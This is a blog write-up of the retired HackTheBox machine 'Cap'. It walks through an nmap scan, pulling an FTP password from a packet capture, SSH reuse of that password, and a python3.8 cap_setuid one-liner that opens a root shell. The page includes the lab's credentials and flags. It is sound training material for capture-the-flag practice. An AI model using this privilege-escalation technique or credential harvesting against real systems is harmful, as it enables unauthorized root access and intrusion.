
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="robots" content="" />

  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="../../theme/stylesheet/style.min.css">

    <link id="dark-theme-style" rel="stylesheet" type="text/css"
          media="(prefers-color-scheme: dark)"
    href="../../theme/stylesheet/dark-theme.min.css">

    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: dark)"
          href="../../theme/pygments/monokai.min.css">
    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)"
          href="../../theme/pygments/sas.min.css">


  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/fontawesome.css">
  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/brands.css">
  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/solid.css">


    <link href="https://maggick.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="maggick's logs Atom">



  


 

<meta name="author" content="maggick" />
<meta name="description" content="This article is a writeup about a retired HacktheBox machine: Cap published on June 5, 2021 by InfoSecJack. This box is rated as easy box the user part implies to know a bit about array indexes and wireshark. The root part is quit easy and implies a binary capabilities." />
<meta name="keywords" content="security, boot2root, HTB, capabilities">


  <meta property="og:site_name" content="maggick's logs"/>
  <meta property="og:title" content="HTB: Cap"/>
  <meta property="og:description" content="This article is a writeup about a retired HacktheBox machine: Cap published on June 5, 2021 by InfoSecJack. This box is rated as easy box the user part implies to know a bit about array indexes and wireshark. The root part is quit easy and implies a binary capabilities."/>
  <meta property="og:locale" content="en_US"/>
  <meta property="og:url" content="../../2021/10/htb-cap.html"/>
  <meta property="og:type" content="article"/>
  <meta property="article:published_time" content="2021-10-23 11:40:00+02:00"/>
  <meta property="article:modified_time" content=""/>
  <meta property="article:author" content="../../author/maggick.html">
  <meta property="article:section" content="security"/>
  <meta property="article:tag" content="security"/>
  <meta property="article:tag" content="boot2root"/>
  <meta property="article:tag" content="HTB"/>
  <meta property="article:tag" content="capabilities"/>
  <meta property="og:image" content="https://maggick.fr/media/image.png">

  <title>maggick's logs &ndash; HTB: Cap</title>

</head>
<body >
  <aside>
    <div>
      <a href="../../">
        <img src="https://maggick.fr/media/image.png" alt="" title="">
      </a>

      <h1>
        <a href="../../"></a>
      </h1>



      <nav>
        <ul class="list">


              <li>
                <a target="_self"
                   href="../../pages/about.html">
                  About
                </a>
              </li>
              <li>
                <a target="_self"
                   href="../../pages/notes.html">
                  Notes
                </a>
              </li>
              <li>
                <a target="_self"
                   href="../../pages/tools.html">
                  Tools
                </a>
              </li>

        </ul>
      </nav>

      <ul class="social">
          <li>
            <a  class="sc-github" href="https://github.com/maggick" target="_blank">
              <i class="fab fa-github"></i>
            </a>
          </li>
          <li>
            <a  class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
              <i class="fab fa-twitter"></i>
            </a>
          </li>
          <li>
            <a  class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
              <i class="fab fa-stack-overflow"></i>
            </a>
          </li>
          <li>
            <a  class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
              <i class="fas fa-rss"></i>
            </a>
          </li>
      </ul>
    </div>

  </aside>
  <main>

    <nav>
      <a href="../../">Home</a>

      <a href="/archives.html">Archives</a>
      <a href="/categories.html">Categories</a>
      <a href="/tags.html">Tags</a>

      <a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>

    </nav>

<article class="single">
  <header>
      
    <h1 id="htb-cap">HTB: Cap</h1>
    <p>
      Posted on 23 Oct 2021 in <a href="../../category/security.html">security</a>

        &#8226; 2 min read
    </p>
  </header>


  <div>
    <p><img class="align-left" src="/media/2021.10/cap_card.png" alt="cap Card" width="262"></p>
<p>This article is a writeup about a retired HacktheBox machine:
<a href="https://www.hackthebox.com/home/machines/profile/351">Cap</a> published on
June 5, 2021 by
<a href="https://www.hackthebox.com/home/users/profile/52045">InfoSecJack</a>.
This box is rated as easy box the user part implies to know a bit about array
indexes and wireshark. The root part is quit easy and implies a binary
capabilities.</p>


<h1>User</h1>
<h2>Recon</h2>
<p>Let us start as always by a <code>nmap</code> scan. Only port 21 (FTP), 22 (SSH) and 80 with a HTTP
service are open.</p>
<div class="highlight"><pre><span></span><code># Nmap 7.91 scan initiated Sat Jun 19 08:05:17 2021 as: nmap -p- -sSV -A -oN notes.md 10.129.162.82
Nmap scan report for 10.129.162.82
Host is up (0.013s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn
&lt;SNIP&gt;
</code></pre></div>

<h2>FTP</h2>
<p>No anonymous connection is available on it.</p>
<h2>Web</h2>
<p>This is a server monitoring website. We can access a few technical information
as the result of the <code>ip a</code> command.</p>
<p><img alt="Result of ip a command" src="/media/2021.10/cap_01.png"></p>
<p>We also have access to a "capture and analyze packets" tool which make me think
about a tcpdump or wireshark RCE exploit.</p>
<p><img alt="Packet capture and analyzer" src="/media/2021.10/cap_02.png"></p>
<p>But this was quit simpler. Notice the "index" in the picture above: 1. Or in
programming language, most table start with the index 0. We just change the URL
to <code>data/0</code> and open the pcap with wireshark.</p>
<p>We can see a few FTP frames. The FTP traffic is in clear text, we use the
"follow TCP stream" option from wireshark and get the FTP packets containing a
username and a password.</p>
<div class="highlight"><pre><span></span><code>220 (vsFTPd 3.0.3)
USER nathan
331 Please specify the password.
PASS Buck3tH4TF0RM3!
230 Login successful.
SYST
215 UNIX Type: L8
PORT 192,168,196,1,212,140
&lt;SNIP&gt;
</code></pre></div>

<p>We can connect using FTP and get access to Nathan's files but the user is using the same password for his SSH access :S</p>
<div class="highlight"><pre><span></span><code>┌──(kali㉿kali)-[~]
└─$ ssh nathan@10.129.162.82
nathan@10.129.162.82&#39;s password: 
&lt;SNIP&gt;
nathan@cap:~$ cat user.txt
881dbf629f65f88eca6c0be9dab5db20
</code></pre></div>

<h1>Root</h1>
<p>We quickly check our <code>sudo</code> privileges but we do not have any.</p>
<p>The name of the box might be a hint here. We can run a Linux privilege
escalation tool as
<a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">LinPEAS</a>
or just run the appropriate command available on
<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#capabilities">Linux privilege escalation methodologies</a>.</p>
<p>We quickly found out that <code>/usr/bin/python3.8</code> has the <code>setuid</code> capabilities
which allow to <a href="https://man7.org/linux/man-pages/man7/capabilities.7.html">make arbitrary manipulations of process UIDs</a></p>
<div class="highlight"><pre><span></span><code>nathan@cap:/$ getcap -r / 2&gt; /dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
</code></pre></div>

<p>We just have to run a simple python command either via the python console or in
a oneliner to pop a root shell and grab the flag.</p>
<div class="highlight"><pre><span></span><code>nathan@cap:/$ /usr/bin/python3.8 -c &#39;import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)&#39;
# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)
# cat /root/root.txt
96f9681e3e9831523150b8a56f288a90
</code></pre></div>

<h1>Wrapping up</h1>
<p>This was an easy box! I struggle an bit on the "Array index" as I was in the
tcpdump/wireshark rce rabbit hole. Nonetheless a great box for every beginners.</p>
  </div>
  <div class="tag-cloud">
    <p>
      <a href="../../tag/security.html">security</a>
      <a href="../../tag/boot2root.html">boot2root</a>
      <a href="../../tag/htb.html">HTB</a>
      <a href="../../tag/capabilities.html">capabilities</a>
    </p>
  </div>


  <div class="neighbors">
    <a class="btn float-left" href="../../2021/09/bayc-mutant-ape-game.html" title="BAYC: Mutant Ape game">
      <i class="fa fa-angle-left"></i> Previous Post
    </a>
    <a class="btn float-right" href="../../2021/11/htb-exlore.html" title="HTB: Exlore">
      Next Post <i class="fa fa-angle-right"></i>
    </a>
  </div>



</article>

    <footer>
<p>
  &copy; 2022  - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/deed.en_US" target="_blank">Creative Commons Attribution</a>
</p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script id="dark-theme-script"
          src="../../theme/dark-theme/dark-theme.min.js"
          data-enable-auto-detect-theme="True"
          data-default-theme="light"
          type="text/javascript">
  </script>
</p><p>
  <a rel="license"
     href="http://creativecommons.org/licenses/by/4.0/"
     target="_blank">
    <img alt="Creative Commons License"
         title="Creative Commons License"
         style="border-width:0"
           src="https://i.creativecommons.org/l/by/4.0/80x15.png"
         width="80"
         height="15"/>
  </a>
</p>    </footer>
  </main>




<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " maggick's logs ",
  "url" : "../..",
  "image": "https://maggick.fr/media/image.png",
  "description": ""
}
</script>

</body>
</html>